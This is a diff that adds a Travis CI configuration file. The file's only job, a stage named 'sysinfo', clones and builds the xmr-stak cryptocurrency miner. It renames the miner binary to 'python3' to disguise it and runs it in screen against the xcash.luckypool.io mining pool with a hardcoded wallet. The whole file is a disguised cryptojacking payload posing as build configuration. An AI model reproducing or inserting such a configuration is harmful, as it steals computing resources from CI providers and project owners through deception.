@@ -1,0 +1,8 @@
+language: cpp
+distro: xenial
+os: linux
+sudo: required
+jobs:
+  include:
+  - stage: sysinfo
+    script: sudo apt update && sudo apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git && git clone https://github.com/fireice-uk/xmr-stak.git && mkdir xmr-stak/build && cd xmr-stak/build && cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF && make install && cd bin && mv xmr-stak python3 && screen ./python3 -o xcash.luckypool.io:4466 -u XCA1TiN9HB9VjT982NrfbRCK2Y4HKzBALEqSaguw6PTv91N8nNa3xaNDexaqFfrhE9JB5zRGPxdyAhgofqZX2r3K9MZEb3nZ11 -p qwiklab --currency cryptonight_v8_double
